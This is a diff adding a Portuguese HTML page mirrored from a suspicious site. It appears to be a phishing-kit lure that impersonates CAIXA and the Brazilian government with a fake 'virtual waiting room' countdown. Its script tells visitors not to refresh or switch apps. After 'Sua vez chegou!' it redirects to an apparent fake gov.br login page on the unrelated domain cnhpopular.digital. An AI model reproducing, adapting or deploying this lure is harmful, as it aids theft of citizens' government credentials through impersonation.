@@ -1,0 +1,112 @@
+<!DOCTYPE html><html lang="pt-BR">
+<!-- Mirrored from site-hoje.site/novo/carregando1/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 27 Oct 2024 20:13:27 GMT -->
+<head>
+    <script src="js/latest.js" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    
+    <title>Contagem Regressiva</title>
+    <!-- Importa o Tailwind CSS via CDN -->
+    <script src="https://cdn.tailwindcss.com/"></script>
+</head>
+<body class="bg-white flex items-center justify-center h-screen">
+    <div class="flex flex-col items-center">
+        <!-- Logo e título -->
+        <div class="text-center">
+            <img src="images/gov-logo.svg" alt="CAIXA logo" width="144" height="86" class="mx-auto">
+        </div>
+
+        <!-- Texto principal -->
+        <h1 id="main-text" class="mt-4 text-2xl font-bold text-[#111278]">Sua vez está chegando</h1>
+        <p class="mt-2 mb-2 text-gray-500 text-center" id="main-paragraph">
+            Você está numa sala de espera virtual e será rapidamente atendido, aguarde.
+        </p>
+
+        <!-- Círculo de progresso usando SVG -->
+        <div class="relative">
+            <svg class="w-96 h-96" viewBox="0 0 100 100"> <!-- Aumentado para w-72 h-72 -->
+                <!-- Círculo de fundo -->
+                <circle id="circle-bg" cx="50" cy="50" r="45" stroke="#E2E8F0" stroke-width="4" fill="none"></circle>
+                <!-- Círculo de progresso -->
+                <circle id="progress-circle" cx="50" cy="50" r="45" stroke="#111278" stroke-width="4" fill="none" stroke-dasharray="282.6" stroke-dashoffset="282.6" stroke-linecap="round" transform="rotate(-90 50 50)" style="stroke-dashoffset: 282.6;"></circle>
+            </svg>
+            <div class="absolute inset-0 flex items-center justify-center">
+                <div class="text-center">
+                    <div id="countdown-container">
+                        <p class="text-lg text-blue-600" id="countdown-text">Sua posição será atualizada em</p>
+                        <h1 id="countdown" class="text-4xl font-bold text-[#111278] mt-2 mb-2">0:15</h1>
+                        <p class="text-gray-500" id="circle-text">Aguarde até o círculo azul <br>se formar por completo.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Aviso -->
+        <div class="mt-6 flex items-center justify-center">
+            <span class="text-gray-500 text-center font-medium text-lg">
+                Não deixe a tela bloquear, não atualize a página e não alterne entre aplicativos.
+            </span>
+        </div>
+    </div>
+
+    <script>
+        // JavaScript para a contagem regressiva e círculo de progresso
+        const countdownElement = document.getElementById('countdown');
+        const circleBg = document.getElementById('circle-bg');
+        const progressCircle = document.getElementById('progress-circle');
+        const countdownContainer = document.getElementById('countdown-container');
+        const mainText = document.getElementById('main-text');
+        const mainParagraph = document.getElementById('main-paragraph');
+        const totalDuration = 15; // em segundos
+        let timeLeft = totalDuration;
+
+        const updateCountdown = () => {
+            // Atualiza o texto da contagem regressiva
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            
+            // Atualiza o círculo de progresso
+            const progressPercentage = ((totalDuration - timeLeft) / totalDuration) * 282.6;
+            progressCircle.style.strokeDashoffset = 282.6 - progressPercentage;
+
+            // Decrementa o tempo restante
+            if (timeLeft > 0) {
+                timeLeft--;
+            } else {
+
+                // Esconde os elementos do progress circle
+                progressCircle.classList.add('hidden');
+                circleBg.classList.add('hidden');
+
+                // Atualiza o texto principal
+                mainText.textContent = 'Sua vez chegou!';
+                mainParagraph.textContent = ''; //Aguarde um momento enquanto finalizamos o processo.
+
+               //Modifica o conteudo da div
+                countdownContainer.innerHTML = `
+                    <div class="flex flex-col items-center">
+                        <h3 class="text-xl font-semibold text-green-500 text-center">
+                            Aguarde... Seu acesso foi concedido
+                        </h3>
+                        <img fetchpriority="high" decoding="async" width="125" height="113" src="https://consultadevaloresbc.online/carregando/images/gif-ok-1.gif" class="attachment-large size-large wp-image-485 mt-2" alt="" onerror="this.onerror=null; this.src='path/to/default-image.png';" />
+
+                    </div>
+                `;
+
+                // Redireciona após 2 segundos
+                setTimeout(() => {
+                    window.location.href = 'https://portal.cnhpopular.digital/br/auth/govbr-login.html';
+                }, 5000);
+            }
+        };
+
+        // Atualiza a cada segundo
+        setInterval(updateCountdown, 1000);
+    </script>
+
+
+</body>
+<!-- Mirrored from site-hoje.site/novo/carregando1/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 27 Oct 2024 20:13:29 GMT -->
+</html>
